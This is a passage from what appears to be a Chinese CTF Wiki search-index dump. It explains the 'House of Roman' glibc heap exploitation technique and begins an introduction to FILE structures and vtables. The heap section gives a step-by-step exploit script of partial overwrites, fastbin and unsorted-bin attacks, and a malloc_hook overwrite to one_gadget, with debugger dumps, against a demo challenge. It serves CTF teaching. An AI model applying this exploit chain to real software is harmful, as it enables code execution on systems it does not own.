\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 \nmalloc_hook\n \u6240\u5728\u7684\u90a3\u4e2a \nchunk\n .\n\n\ncreate(0x65,0)\ncreate(0x65,0)\ncreate(0x65,0)\n\n\n\n\n\u7136\u540e \nfree\n \u6389 \nE\n \uff0c\u8fdb\u5165 \nfastbin\n \uff0c\u5229\u7528 \nuaf\n \u8bbe\u7f6e \nE-\nfd = 0\n \uff0c \u4fee\u590d\u4e86 \nfastbin\n\n\nfree(15)\nedit(15,p64(0x00))\ninfo(\n\u518d\u6b21\u751f\u6210 0x71 \u7684 fastbin, \u540c\u65f6\u4fee\u6539 fd =0, \u4fee\u590d fastbin\n)\n\n\n\n\n\u7136\u540e\u662f unsorted bin \u653b\u51fb\uff0c\u4f7f\u5f97 malloc_hook \u7684\u503c\u4e3a main_arena+88\n\n\ncreate(0xc8,1)\ncreate(0xc8,1)\ncreate(0x18,2)\ncreate(0xc8,3)\ncreate(0xc8,4)\nfree(1)\npo = \nB\n*8\npo += \n\\x00\\x1b\n\nedit(1,po)\ncreate(0xc8,1)\ninfo(\nunsorted bin \u4f7f\u5f97 malloc_hook \u6709 libc \u7684\u5730\u5740\n)\n\n\n\n\n\u5229\u7528 \u4fee\u6539 \nmalloc_hook\n \u7684\u4f4e\u4e09\u4e2a\u5b57\u8282 \uff0c\u4f7f\u5f97 \nmalloc_hook\n \u4e3a \none_gadget\n \u7684\u5730\u5740\n\n\nover = \nR\n*0x13   # padding for malloc_hook\nover += \n\\xa4\\xd2\\xaf\n\nedit(0,over)\n\ninfo(\nmalloc_hook to one_gadget\n)\n\n\n\n\n\u7136\u540e \nfree\n  \u4e24\u6b21\u540c\u4e00\u4e2a  \nchunk\n  \uff0c\u89e6\u53d1  \nmalloc_printerr\n  \uff0c \ngetshell\n\n\nfree(18)\nfree(18)\n\n\n\n\nlink\n\n\nhttps://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc\n\n\nhttps://github.com/romanking98/House-Of-Roman\n\n\nhttps://xz.aliyun.com/t/2316", 
            "title": "House of Roman"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#house-of-roman", 
            "text": "", 
            "title": "House of Roman"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#_1", 
            "text": "House of Roman \u8fd9\u4e2a\u6280\u5de7\u8bf4\u7b80\u5355\u70b9\u5176\u5b9e\u5c31\u662f fastbin attack \u548c Unsortbin attachk \u7ed3\u5408\u7684\u4e00\u4e2a\u5c0f trick\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#_2", 
            "text": "\u8be5\u6280\u672f\u7528\u4e8e bypass ALSR\uff0c\u5229\u752812-bit \u7684\u7206\u7834\u6765\u8fbe\u5230\u83b7\u53d6shell\u7684\u76ee\u7684\u3002\u4e14\u4ec5\u4ec5\u53ea\u9700\u8981\u4e00\u4e2a UAF \u6f0f\u6d1e\u4ee5\u53ca\u80fd\u521b\u5efa\u4efb\u610f\u5927\u5c0f\u7684 chunk \u7684\u60c5\u51b5\u4e0b\u5c31\u80fd\u5b8c\u6210\u5229\u7528\u3002", 
            "title": "\u6982\u62ec"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#_3", 
            "text": "\u4f5c\u8005\u63d0\u4f9b\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2a demo \u7528\u4e8e\u5c55\u793a\uff0c\u6574\u4e2a\u5229\u7528\u8fc7\u7a0b\u5927\u6982\u53ef\u4ee5\u5206\u4e3a\u4e09\u6b65\u9aa4\u3002   \u5c06 FD \u6307\u5411 malloc_hook  \u4fee\u6b63 0x71 \u7684 Freelist  \u5f80 malloc_hook \u5199\u5165 one gadget   \u5148\u5bf9 demo \u8fdb\u884c\u4e00\u4e2a\u5927\u81f4\u7684\u5206\u6790\uff1a  \u5f00\u542f\u7684\u4fdd\u62a4\u60c5\u51b5\uff1a  [ * ]   /media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled  \u6837\u9898\u4e2d\u6709\u4e09\u4e2a\u4e3b\u8981\u529f\u80fd\uff0cMalloc \uff0cWrite\uff0c\u4ee5\u53ca Free\u3002       switch   (   v4   ) \n     { \n       case   1 : \n         puts ( Malloc ); \n         v5   =   malloc_chunk ( Malloc ); \n         if   (   ! v5   ) \n           puts ( Error ); \n         break ; \n       case   2 : \n         puts ( Write ); \n         write_chunk ( Write ); \n         break ; \n       case   3 : \n         puts ( Free ); \n         free_chunk (); \n         break ; \n       default : \n         puts ( Invalid choice ); \n         break ;   \u5728 Free \u529f\u80fd\u4e2d\u5b58\u5728 \u6307\u9488\u672a\u7f6e\u96f6\u800c\u9020\u6210\u7684\u60ac\u6302\u6307\u9488\u3002  void   free_chunk ()  { \n   unsigned   int   v0 ;   // [rsp+Ch] [rbp-4h]@1 \n\n   printf ( \\n Enter index : ); \n   __isoc99_scanf ( %d ,   v0 ); \n   if   (   v0   =   0x13   ) \n     free ( heap_ptrs [( unsigned   __int64 ) v0 ]);  }", 
            "title": "\u539f\u7406\u4ee5\u53ca\u5c55\u793a"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#_4", 
            "text": "\u9996\u5148\u4f2a\u9020\u4e00\u4e2a chunk  \uff0cchunk\u7684\u5927\u5c0f\u4e3a0x61\u3002\u7d27\u63a5\u7740\u6211\u4eec\u5229\u7528 partial overwrite \u5c06 FD \u6307\u5411\u4f2a\u9020\u7684chunk\uff08\u5f53\u7136\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u53ef\u4ee5\u7528 UAF \u5b8c\u6210\uff09\u3002  \u4f2a\u9020 chunk size  pwndbg \n0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757090: 0x41414141      0x41414141      0x61    0x0      ----------  \u8fd9\u91cc\uff0c\u6211\u4eec free \u6389 chunk 1\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u80fd\u83b7\u5f97\u4e00\u4e2a unsortbin  0x555555757020 PREV_INUSE {\n  prev_size = 0x0,\n  size = 0xd1,\n  fd = 0x7ffff7dd1b58  main_arena+88 ,\n  bk = 0x7ffff7dd1b58  main_arena+88 ,\n  fd_nextsize = 0x4141414141414141,\n  bk_nextsize = 0x4141414141414141\n}  \u63a5\u7740\uff0c\u6211\u4eec\u91cd\u5206\u914d 0xd1 \u8fd9\u5757 chunk\uff0c\u4ee5\u53ca\u4fee\u6539\u5176 size \u4e3a0x71  pwndbg  x/40ag 0x555555757020\n0x555555757020: 0x4141414141414141      0x71\n0x555555757030: 0x7ffff7dd1b58  main_arena+88   0x7ffff7dd1b58  main_arena+88 \n0x555555757040: 0x4141414141414141      0x4141414141414141\n0x555555757050: 0x4141414141414141      0x4141414141414141\n0x555555757060: 0x4141414141414141      0x4141414141414141\n0x555555757070: 0x4141414141414141      0x4141414141414141\n0x555555757080: 0x4141414141414141      0x4141414141414141\n0x555555757090: 0x4141414141414141      0x61  \u6211\u4eec\u7d27\u63a5\u7740\u9700\u8981\u4fee\u6b63\u8fd90x71 FD freelist \uff0c\u5c06\u5176\u4f2a\u9020\u6210\u5df2\u7ecf\u91ca\u653e\u7684\u5757  pwndbg  x/40ag 0x555555757000\n0x555555757000: 0x0     0x21\n0x555555757010: 0x4141414141414141      0x4141414141414141\n0x555555757020: 0x4141414141414141      0x71        ----------  free 0x71\n0x555555757030: 0x7ffff7dd1b58  main_arena+88   0x7ffff7dd1b58  main_arena+88 \n0x555555757040: 0x4141414141414141      0x4141414141414141\n0x555555757050: 0x4141414141414141      0x4141414141414141\n0x555555757060: 0x4141414141414141      0x4141414141414141\n0x555555757070: 0x4141414141414141      0x4141414141414141\n0x555555757080: 0x4141414141414141      0x4141414141414141\n0x555555757090: 0x4141414141414141      0x61\n0x5555557570a0: 0x0     0x0\n0x5555557570b0: 0x0     0x0\n0x5555557570c0: 0x0     0x0\n0x5555557570d0: 0x0     0x0\n0x5555557570e0: 0x0     0x0\n0x5555557570f0: 0xd0    0x71    ----------     free 0x71\n0x555555757100: 0x0     0x0\n0x555555757110: 0x0     0x0\n0x555555757120: 0x0     0x0\n0x555555757130: 0x0     0x0  libc : 0x7ffff7a23d28 ( malloc_hook )  \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u7684 FD \u5df2\u7ecf\u5728 malloc hook \u9644\u8fd1\uff0c\u672a\u4e4b\u540e\u7684\u7206\u7834\u505a\u51c6\u5907\u3002", 
            "title": "\u7b2c\u4e00\u6b65"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#_5", 
            "text": "\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7 \u91ca\u653e\u4e00\u57570x71\u5927\u5c0f\u7684 chunk \u5c31\u80fd\u5b8c\u6210 fix\u3002", 
            "title": "\u7b2c\u4e8c\u6b65"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#_6", 
            "text": "\u5229\u7528 unsortebin \u7684\u653b\u51fb\u6280\u5de7\uff0c\u5e76\u4f7f\u7528\u7f16\u8f91\u529f\u80fd\u5c06 onegadet \u5199\u5165    \u3002", 
            "title": "\u7b2c\u4e09\u6b65"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#exp", 
            "text": "\u5206\u914d  3  \u4e2a  chunk  \uff0c\u5728  B + 0x78  \u5904\u8bbe\u7f6e  p64(0x61)  \uff0c \u4f5c\u7528\u662f  fake size  ,\u7528\u4e8e\u540e\u9762 \u7684  fastbin attack  create ( 0x18 , 0 )   # 0x20  create ( 0xc8 , 1 )   # d0  create ( 0x65 , 2 )    # 0x70  info ( create 2 chunk, 0x20, 0xd8 )  fake   =   A * 0x68  fake   +=   p64 ( 0x61 )    ## fake size  edit ( 1 , fake )  info ( fake )   \u91ca\u653e\u6389  B  , \u7136\u540e\u5206\u914d\u540c\u6837\u5927\u5c0f\u518d\u6b21\u5206\u914d\u5230  B  , \u6b64\u65f6  B+0x10  \u548c  B+0x18  \u4e2d\u6709  main_arean  \u7684\u5730\u5740\u3002\u5206\u914d  3  \u4e2a  fastbin  \uff0c\u5229\u7528  off by one  \u4fee\u6539  B- size = 0x71  free(1)\ncreate(0xc8,1)\n\ncreate(0x65,3)  # b\ncreate(0x65,15)\ncreate(0x65,18)\n\nover =  A *0x18  # off by one\nover +=  \\x71   # set chunk  1 s size --  0x71\nedit(0,over)\ninfo( \u5229\u7528 off by one ,  chunk  1 s size --  0x71 )  \u751f\u6210\u4e24\u4e2a  fastbin  \uff0c\u7136\u540e\u5229\u7528  uaf  \uff0c\u90e8\u5206\u5730\u5740\u5199\uff0c\u628a  B  \u94fe\u5165\u5230  fastbin  free ( 2 )  free ( 3 )  info ( \u521b\u5efa\u4e24\u4e2a 0x70 \u7684 fastbin )  heap_po   =   \\x20  edit ( 3 , heap_po )  info ( \u628a chunk 1 \u94fe\u5165\u5230 fastbin \u91cc\u9762 )   \u8c03\u8bd5\u770b\u770b\u6b64\u65f6  fastbin  \u7684\u72b6\u6001  pwndbg  fastbins \nfastbins\n0x20: 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x555555757160 \u2014\u25b8 0x555555757020 \u2014\u25b8 0x7ffff7dd1b78 (main_arena+88) \u25c2\u2014 0x7ffff7dd1b78\n0x80: 0x0   0x555555757020  \u5c31\u662f  chunk B   \u7136\u540e\u901a\u8fc7\u4fee\u6539  B- fd  \u7684\u4f4e  2  \u5b57\u8282\uff0c \u4f7f\u5f97  B- fd= malloc_hook - 0x23  # malloc_hook \u4e0a\u65b9\nmalloc_hook_nearly =  \\xed\\x1a \nedit(1,malloc_hook_nearly)\ninfo( \u90e8\u5206\u5199\uff0c\u4fee\u6539 fastbin- fd ---  malloc_hook )  \u7136\u540e\u5206\u914d  3  \u4e2a  0x70  \u7684  chunk  \uff0c\u5c31\u53ef\u4ee5\u62ff\u5230  malloc_hook  \u6240\u5728\u7684\u90a3\u4e2a  chunk  .  create(0x65,0)\ncreate(0x65,0)\ncreate(0x65,0)  \u7136\u540e  free  \u6389  E  \uff0c\u8fdb\u5165  fastbin  \uff0c\u5229\u7528  uaf  \u8bbe\u7f6e  E- fd = 0  \uff0c \u4fee\u590d\u4e86  fastbin  free(15)\nedit(15,p64(0x00))\ninfo( \u518d\u6b21\u751f\u6210 0x71 \u7684 fastbin, \u540c\u65f6\u4fee\u6539 fd =0, \u4fee\u590d fastbin )  \u7136\u540e\u662f unsorted bin \u653b\u51fb\uff0c\u4f7f\u5f97 malloc_hook \u7684\u503c\u4e3a main_arena+88  create(0xc8,1)\ncreate(0xc8,1)\ncreate(0x18,2)\ncreate(0xc8,3)\ncreate(0xc8,4)\nfree(1)\npo =  B *8\npo +=  \\x00\\x1b \nedit(1,po)\ncreate(0xc8,1)\ninfo( unsorted bin \u4f7f\u5f97 malloc_hook \u6709 libc \u7684\u5730\u5740 )  \u5229\u7528 \u4fee\u6539  malloc_hook  \u7684\u4f4e\u4e09\u4e2a\u5b57\u8282 \uff0c\u4f7f\u5f97  malloc_hook  \u4e3a  one_gadget  \u7684\u5730\u5740  over =  R *0x13   # padding for malloc_hook\nover +=  \\xa4\\xd2\\xaf \nedit(0,over)\n\ninfo( malloc_hook to one_gadget )  \u7136\u540e  free   \u4e24\u6b21\u540c\u4e00\u4e2a   chunk   \uff0c\u89e6\u53d1   malloc_printerr   \uff0c  getshell  free(18)\nfree(18)", 
            "title": "\u5206\u6790 exp"
        }, 
        {
            "location": "/pwn/heap/house_of_roman/#link", 
            "text": "https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc  https://github.com/romanking98/House-Of-Roman  https://xz.aliyun.com/t/2316", 
            "title": "link"
        }, 
        {
            "location": "/pwn/io_file/introduction/", 
            "text": "FILE\u7ed3\u6784\n\n\nFILE\u4ecb\u7ecd\n\n\nFILE\u5728Linux\u7cfb\u7edf\u7684\u6807\u51c6IO\u5e93\u4e2d\u662f\u7528\u4e8e\u63cf\u8ff0\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u79f0\u4e3a\u6587\u4ef6\u6d41\u3002\nFILE\u7ed3\u6784\u5728\u7a0b\u5e8f\u6267\u884cfopen\u7b49\u51fd\u6570\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\uff0c\u5e76\u5206\u914d\u5728\u5806\u4e2d\u3002\u6211\u4eec\u5e38\u5b9a\u4e49\u4e00\u4e2a\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\u6765\u63a5\u6536\u8fd9\u4e2a\u8fd4\u56de\u503c\u3002\n\n\nFILE\u7ed3\u6784\u5b9a\u4e49\u5728libio.h\u4e2d\uff0c\u5982\u4e0b\u6240\u793a\n\n\nstruct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it\ns too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n\n\n\n\n\u8fdb\u7a0b\u4e2d\u7684FILE\u7ed3\u6784\u4f1a\u901a\u8fc7_chain\u57df\u5f7c\u6b64\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf_IO_list_all\u8868\u793a\uff0c\u901a\u8fc7\u8fd9\u4e2a\u503c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684FILE\u7ed3\u6784\u3002\n\n\n\u5728\u6807\u51c6I/O\u5e93\u4e2d\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u542f\u52a8\u65f6\u6709\u4e09\u4e2a\u6587\u4ef6\u6d41\u662f\u81ea\u52a8\u6253\u5f00\u7684\uff1astdin\u3001stdout\u3001stderr\u3002\u56e0\u6b64\u5728\u521d\u59cb\u72b6\u6001\u4e0b\uff0c_IO_list_all\u6307\u5411\u4e86\u4e00\u4e2a\u6709\u8fd9\u4e9b\u6587\u4ef6\u6d41\u6784\u6210\u7684\u94fe\u8868\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e09\u4e2a\u6587\u4ef6\u6d41\u4f4d\u4e8elibc.so\u7684\u6570\u636e\u6bb5\u3002\u800c\u6211\u4eec\u4f7f\u7528fopen\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a\u7684\u3002\n\n\n\u6211\u4eec\u53ef\u4ee5\u5728libc.so\u4e2d\u627e\u5230stdin\\stdout\\stderr\u7b49\u7b26\u53f7\uff0c\u8fd9\u4e9b\u7b26\u53f7\u662f\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\uff0c\u771f\u6b63\u7ed3\u6784\u7684\u7b26\u53f7\u662f\n\n\n_IO_2_1_stderr_\n_IO_2_1_stdout_\n_IO_2_1_stdin_\n\n\n\n\n\u4f46\u662f\u4e8b\u5b9e\u4e0a_IO_FILE\u7ed3\u6784\u5916\u5305\u88f9\u7740\u53e6\u4e00\u79cd\u7ed3\u6784_IO_FILE_plus\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u91cd\u8981\u7684\u6307\u9488vtable\u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488\u3002\n\n\n\u5728libc2.23\u7248\u672c\u4e0b\uff0c32\u4f4d\u7684vtable\u504f\u79fb\u4e3a0x94\uff0c64\u4f4d\u504f\u79fb\u4e3a0x228\n\n\nstruct _IO_FILE_plus\n{\n    _IO_FILE    file;\n    IO_jump_t   *vtable;\n}\n\n\n\n\nvtable\u662fIO_jump_t\u7c7b\u578b\u7684\u6307\u9488\uff0cIO_jump_t\u4e2d\u4fdd\u5b58\u4e86\u4e00\u4e9b\u51fd\u6570\u6307\u9488\uff0c\u5728\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\u5728\u4e00\u7cfb\u5217\u6807\u51c6IO\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u6307\u9488\n\n\nvoid\u00a0*\u00a0funcs[]\u00a0=\u00a0{\n\u00a0\u00a0\u00a01\u00a0NULL,\u00a0//\u00a0\nextra\u00a0word\n\n\u00a0\u00a0\u00a02\u00a0NULL,\u00a0//\u00a0DUMMY\n\u00a0\u00a0\u00a03\u00a0exit,\u00a0//\u00a0finish\n\u00a0\u00a0\u00a04\u00a0NULL,\u00a0//\u00a0overflow\n\u00a0\u00a0\u00a05\u00a0NULL,\u00a0//\u00a0underflow\n\u00a0\u00a0\u00a06\u00a0NULL,\u00a0//\u00a0uflow\n\u00a0\u00a0\u00a07\u00a0NULL,\u00a0//\u00a0pbackfail\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a08\u00a0NULL,\u00a0//\u00a0xsputn  #printf\n\u00a0\u00a0\u00a09\u00a0NULL,\u00a0//\u00a0xsgetn\n\u00a0\u00a0\u00a010\u00a0NULL,\u00a0//\u00a0seekoff\n\u00a0\u00a0\u00a011\u00a0NULL,\u00a0//\u00a0seekpos\n\u00a0\u00a0\u00a012\u00a0NULL,\u00a0//\u00a0setbuf\n\u00a0\u00a0\u00a013\u00a0NULL,\u00a0//\u00a0sync\n\u00a0\u00a0\u00a014\u00a0NULL,\u00a0//\u00a0doallocate\n\u00a0\u00a0\u00a015\u00a0NULL,\u00a0//\u00a0read\n\u00a0\u00a0\u00a016\u00a0NULL,\u00a0//\u00a0write\n\u00a0\u00a0\u00a017\u00a0NULL,\u00a0//\u00a0seek\n\u00a0\u00a0\u00a018\u00a0pwn,\u00a0\u00a0//\u00a0close\n\u00a0\u00a0\u00a019\u00a0NULL,\u00a0//\u00a0stat\n\u00a0\u00a0\u00a020\u00a0NULL,\u00a0//\u00a0showmanyc\n\u00a0\u00a0\u00a021\u00a0NULL,\u00a0//\u00a0imbue\n};\n\n\n\n\nfread\n\n\nfread\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b\n\n\nsize_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;\n\n\n\n\n\n\n\n\nbuffer \u5b58\u653e\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u51b2\u533a\u3002\n\n\n\n\n\n\nsize\uff1a\u6307\u5b9a\u6bcf\u4e2a\u8bb0\u5f55\u7684\u957f\u5ea6\u3002\n\n\n\n\n\n\ncount\uff1a \u6307\u5b9a\u8bb0\u5f55\u7684\u4e2a\u6570\u3002\n\n\n\n\n\n\nstream\uff1a\u76ee\u6807\u6587\u4ef6\u6d41\u3002\n\n\n\n\n\n\n\u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u8bfb\u53d6\u5230\u6570\u636e\u7f13\u51b2\u533a\u4e2d\u7684\u8bb0\u5f55\u4e2a\u6570\n\n\n\n\n\n\nfread\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofread.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fread\uff0c\u4f46\u771f\u6b63\u7684\u529f\u80fd\u5b9e\u73b0\u5728\u5b50\u51fd\u6570_IO_sgetn\u4e2d\u3002\n\n\n_IO_size_t\n_IO_fread (buf, size, count, fp)\n     void *buf;\n     _IO_size_t size;\n     _IO_size_t count;\n     _IO_FILE *fp;\n{\n  ...\n  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);\n  ...\n}\n\n\n\n\n\u5728_IO_sgetn\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528_IO_XSGETN\uff0c\u800c_IO_XSGETN\u662f_IO_FILE_plus.vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u5728\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u4f1a\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u7136\u540e\u518d\u8fdb\u884c\u8c03\u7528\u3002\n\n\n_IO_size_t\n_IO_sgetn (fp, data, n)\n     _IO_FILE *fp;\n     void *data;\n     _IO_size_t n;\n{\n  return _IO_XSGETN (fp, data, n);\n}\n\n\n\n\n\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u51fd\u6570\u6307\u9488\u662f\u6307\u5411_IO_file_xsgetn\u51fd\u6570\u7684\uff0c\n\n\n  if (fp-\n_IO_buf_base\n          \n want \n (size_t) (fp-\n_IO_buf_end - fp-\n_IO_buf_base))\n        {\n          if (__underflow (fp) == EOF)\n        break;\n\n          continue;\n        }\n\n\n\n\nfwrite\n\n\nfwrite\u540c\u6837\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5411\u6587\u4ef6\u6d41\u5199\u5165\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b\n\n\nsize_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);\n\n\n\n\n\n\n\n\nbuffer:\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9fwrite\u6765\u8bf4\uff0c\u662f\u8981\u5199\u5165\u6570\u636e\u7684\u5730\u5740;\n\n\n\n\n\n\nsize:\u8981\u5199\u5165\u5185\u5bb9\u7684\u5355\u5b57\u8282\u6570;\n\n\n\n\n\n\ncount:\u8981\u8fdb\u884c\u5199\u5165size\u5b57\u8282\u7684\u6570\u636e\u9879\u7684\u4e2a\u6570;\n\n\n\n\n\n\nstream:\u76ee\u6807\u6587\u4ef6\u6307\u9488;\n\n\n\n\n\n\n\u8fd4\u56de\u503c\uff1a\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u9879\u4e2a\u6570count\u3002\n\n\n\n\n\n\nfwrite\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofwrite.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fwrite\u3002\n\u5728_IO_fwrite\u4e2d\u4e3b\u8981\u662f\u8c03\u7528_IO_XSPUTN\u6765\u5b9e\u73b0\u5199\u5165\u7684\u529f\u80fd\u3002\n\n\n\u6839\u636e\u524d\u9762\u5bf9_IO_FILE_plus\u7684\u4ecb\u7ecd\uff0c\u53ef\u77e5_IO_XSPUTN\u4f4d\u4e8e_IO_FILE_plus\u7684vtable\u4e2d\uff0c\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\uff0c\u518d\u8df3\u8fc7\u53bb\u8fdb\u884c\u8c03\u7528\u3002\n\n\nwritten = _IO_sputn (fp, (const char *) buf, request);\n\n\n\n\n\u5728_IO_XSPUTN\u5bf9\u5e94\u7684\u9ed8\u8ba4\u51fd\u6570_IO_new_file_xsputn\u4e2d\u4f1a\u8c03\u7528\u540c\u6837\u4f4d\u4e8evtable\u4e2d\u7684_IO_OVERFLOW\n\n\n /* Next flush the (full) buffer. */\n      if (_IO_OVERFLOW (f, EOF) == EOF)\n\n\n\n\n_IO_OVERFLOW\u9ed8\u8ba4\u5bf9\u5e94\u7684\u51fd\u6570\u662f_IO_new_file_overflow\n\n\nif (ch == EOF)\n    return _IO_do_write (f, f-\n_IO_write_base,\n             f-\n_IO_write_ptr - f-\n_IO_write_base);\n  if (f-\n_IO_write_ptr == f-\n_IO_buf_end ) /* Buffer is really full */\n    if (_IO_do_flush (f) == EOF)\n      return EOF;\n\n\n\u5728_IO_new_file_overflow\u5185\u90e8\u6700\u7ec8\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570\n\n\nfopen\n\n\nfopen\u5728\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u6253\u5f00\u6587\u4ef6\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b\n\n\nFILE *fopen(char *filename, *type);\n\n\n\n\n\n\n\n\nfilename:\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84\n\n\n\n\n\n\ntype:\u6253\u5f00\u65b9\u5f0f\u7684\u7c7b\u578b\n\n\n\n\n\n\n\u8fd4\u56de\u503c:\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u6307\u9488\n\n\n\n\n\n\n\u5728fopen\u5185\u90e8\u4f1a\u521b\u5efaFILE\u7ed3\u6784\u5e76\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\n\n\n\u9996\u5148\u5728fopen\u5bf9\u5e94\u7684\u51fd\u6570__fopen_internal\u5185\u90e8\u4f1a\u8c03\u7528malloc\u51fd\u6570\uff0c\u5206\u914dFILE\u7ed3\u6784\u7684\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5FILE\u7ed3\u6784\u662f\u5b58\u50a8\u5728\u5806\u4e0a\u7684\n\n\n*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));\n\n\n\n\n\u4e4b\u540e\u4f1a\u4e3a\u521b\u5efa\u7684FILE\u521d\u59cb\u5316vtable\uff0c\u5e76\u8c03\u7528_IO_file_init\u8fdb\u4e00\u6b65\u521d\u59cb\u5316\u64cd\u4f5c\n\n_IO_JUMPS (\nnew_f-\nfp) = \n_IO_file_jumps;\n_IO_file_init (\nnew_f-\nfp);\n\n\n\n\u5728_IO_file_init\u51fd\u6570\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u4e2d\uff0c\u4f1a\u8c03\u7528_IO_link_in\u628a\u65b0\u5206\u914d\u7684FILE\u94fe\u5165_IO_list_all\u4e3a\u8d77\u59cb\u7684FILE\u94fe\u8868\u4e2d\n\nvoid\n_IO_link_in (fp)\n     struct _IO_FILE_plus *fp;\n{\n    if ((fp-\nfile._flags \n _IO_LINKED) == 0)\n    {\n      fp-\nfile._flags |= _IO_LINKED;\n      fp-\nfile._chain = (_IO_FILE *) _IO_list_all;\n      _IO_list_all = fp;\n      ++_IO_list_all_stamp;\n    